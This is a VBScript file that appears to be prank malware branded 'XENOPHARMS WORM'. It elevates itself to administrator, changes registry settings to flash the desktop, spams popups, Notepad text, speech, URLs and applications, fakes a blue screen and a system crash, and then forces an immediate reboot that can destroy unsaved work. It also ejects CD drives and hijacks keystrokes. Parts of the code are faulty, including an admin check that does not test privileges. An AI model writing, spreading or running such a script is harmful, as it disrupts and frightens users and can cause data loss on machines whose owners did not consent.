' Check if the script is running with administrator rights
Set objShell = CreateObject("Shell.Application")
If Not IsAdmin() Then
    ' If not running as admin, relaunch the script with admin privileges
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End If

' Function to check if the script is running as administrator
Function IsAdmin()
    On Error Resume Next
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = CreateObject("WScript.Shell")
    objShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA")
    If Err.Number = 0 Then
        IsAdmin = True
    Else
        IsAdmin = False
    End If
    On Error GoTo 0
End Function

' Script continues here if admin privileges are granted
Dim WshShell, Speak, i
Set WshShell = CreateObject("WScript.Shell")

' Initialize Randomize to ensure proper random number generation
Randomize

' Display initial warning
WshShell.Popup "XENOPHARMS INJECTED", 3, "Warning", 48

' Change background to purple and green 3 times
For i = 1 To 3
    WshShell.RegWrite "HKCU\Control Panel\Colors\Background", "128 0 128"
    WshShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
    WScript.Sleep 1000
    WshShell.RegWrite "HKCU\Control Panel\Colors\Background", "0 128 0"
    WshShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
    WScript.Sleep 1000
Next

' Text-to-Speech "XENOPHARMS IS THE WORM"
Set Speak = CreateObject("SAPI.SpVoice")
Speak.Speak "XENOPHARMS IS THE WORM"

' Open Notepad with "XENOPHARMS WORM" 5 times
For i = 1 To 5
    WshShell.Run "notepad"
    WScript.Sleep 1000 ' Give time for Notepad to open
    WshShell.SendKeys "XENOPHARMS WORM{ENTER}"
Next

' Open random URLs 15 times
Dim urls
urls = Array("https://example.com", "https://www.youtube.com/@NatekSveXD/videos", "https://www.youtube.com/@Gildeabrotherslol", "https://theannoyingsite.com/", "https://reddit.com")
For i = 1 To 15
    WshShell.Run urls(Int(Rnd * 5))
    WScript.Sleep 1000
Next

' Final warning
For i = 1 To 10
    WshShell.Popup "XENOPHARMS BOUTTA TAKE A POOP IN THE TOILET", 3, "Warning", 48
Next

' Text-to-Speech "XENOPHARMS LOVES WORMS"
Speak.Speak "XENOPHARMS LOVES WORMS"

' Fake Blue Screen of Death
WshShell.Run "cmd /c color 1f && mode con cols=80 lines=25 && echo SYSTEM FAILURE && echo *** STOP: 0x0000007B && pause", 1, True

' Open Notepad saying "XENOPHARMS LOVES WORMS"
WshShell.Run "notepad"
WScript.Sleep 1000
WshShell.SendKeys "XENOPHARMS LOVES WORMS{ENTER}"

' Random Beeps
For i = 1 To 10
    WshShell.Beep
    WScript.Sleep 500
Next

' Glitchy Text in Notepad
WshShell.Run "notepad"
WScript.Sleep 1000
WshShell.SendKeys "XΞNΦPΗΔRMS IŞ HΞRΞ{ENTER}"

' Fake Windows Shutdown Warning
WshShell.Popup "Windows has encountered a critical error and will shut down in 30 seconds.", 5, "System Error", 48
WScript.Sleep 5000

' Open Calculator or Other Random Apps
Dim apps
apps = Array("calc.exe", "mspaint.exe", "write.exe", "cmd.exe")
For i = 1 To 5
    WshShell.Run apps(Int(Rnd * 4))
    WScript.Sleep 1000
Next

' Change System Volume Randomly
For i = 1 To 5
    WshShell.SendKeys "{VOLUME_UP}"
    WScript.Sleep 500
    WshShell.SendKeys "{VOLUME_DOWN}"
Next

' Flashing Screen Effect
For i = 1 To 10
    WshShell.RegWrite "HKCU\Control Panel\Colors\Background", "255 0 0"
    WshShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
    WScript.Sleep 500
    WshShell.RegWrite "HKCU\Control Panel\Colors\Background", "0 0 255"
    WshShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
    WScript.Sleep 500
Next

' Delayed Fake System Crash
WScript.Sleep 5000
WshShell.Run "cmd /c color 1f && mode con cols=80 lines=25 && echo SYSTEM FAILURE - REBOOTING IN 10 SECONDS && timeout /t 10 /nobreak && shutdown /r /t 0", 1, True

' Alt-Tab Spam
For i = 1 To 10
    WshShell.SendKeys "%{TAB}"
    WScript.Sleep 500
Next

' Eject and Close CD Drive (if present)
For i = 1 To 3
    WshShell.Run "cmd /c echo Set oWMP = CreateObject(""WMPlayer.OCX"") > cd.vbs && echo Set colCDROMs = oWMP.cdromCollection >> cd.vbs && echo For i = 0 To colCDROMs.Count - 1 >> cd.vbs && echo colCDROMs.Item(i).Eject >> cd.vbs && echo Next >> cd.vbs && echo WScript.Sleep 2000 >> cd.vbs && echo For i = 0 To colCDROMs.Count - 1 >> cd.vbs && echo colCDROMs.Item(i).Eject >> cd.vbs && echo Next >> cd.vbs && cscript cd.vbs && del cd.vbs", 0, True
    WScript.Sleep 5000
Next

' Random Window Resizing
For i = 1 To 5
    WshShell.SendKeys "% {SPACE}r"
    WScript.Sleep 500
Next

' Mouse Drift
For i = 1 To 10
    WshShell.Run "cmd /c rundll32 user32.dll,SetCursorPos " & (Rnd * 500) & "," & (Rnd * 500), 0, True
    WScript.Sleep 500
Next
